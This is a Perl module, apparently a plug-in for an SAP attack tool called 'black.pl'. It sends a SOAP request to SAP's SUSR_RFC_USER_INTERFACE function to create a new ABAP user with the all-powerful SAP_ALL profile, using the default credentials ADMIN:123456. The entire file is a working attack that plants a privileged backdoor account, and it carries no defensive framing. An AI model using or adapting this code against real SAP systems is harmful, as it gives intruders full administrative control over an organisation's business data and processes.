#!/usr/bin/perl
# Module Create ABAP user

# CONFIG
######################
my $desc ="Add ABAP user (SUSR_RFC_USER_INTERFACE) \n\t Usage: black.pl .. .. $argv[5] [user] [password]\n\t <user> <password> -  name in upper case only and password for new ABAP user, default is ADMIN:123456\n"; 
our $funcName="add_abap_user_Func";

######################
push(@descriptions,$desc);
push(@functions,$funcName);
######################


# Special function
######################

sub add_abap_user_Func()
{
	my $XML='<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
	 <SOAP-ENV:Body>
	  <m:SUSR_RFC_USER_INTERFACE xmlns:m="urn:sap-com:document:sap:rfc:functions">
	   <ACTIVITY>01</ACTIVITY>
	   <PASSWORD>%ABAP_PASSWORD%</PASSWORD>
	   <USER>%ABAP_USER%</USER>
	   <USER_PROFILES>
		<item>
		 <PROFN>SAP_ALL</PROFN>
		</item>
	   </USER_PROFILES>
	  </m:SUSR_RFC_USER_INTERFACE>
	 </SOAP-ENV:Body>
	</SOAP-ENV:Envelope>';

	if ($ARGV[$m_arg_i+1]){
		$abap_user=$ARGV[$m_arg_i+1];
		print $abap_user." - abap_user \n\n";
	} else {
		$abap_user='ADMIN';
	}

	if ($ARGV[$m_arg_i+2]){
		$abap_pass=$ARGV[$m_arg_i+2];
		print $abap_pass." - abap_pass \n\n";	
	} else {
		$abap_pass='123456';
	}
	
	$XML=~s/%ABAP_PASSWORD%/$abap_pass/s;
	$XML=~s/%ABAP_USER%/$abap_user/s;

	my @answers=send_soap($XML,1);

	my $answer=join('', @answers);
	
	print $answer;

	print "\n\n";

}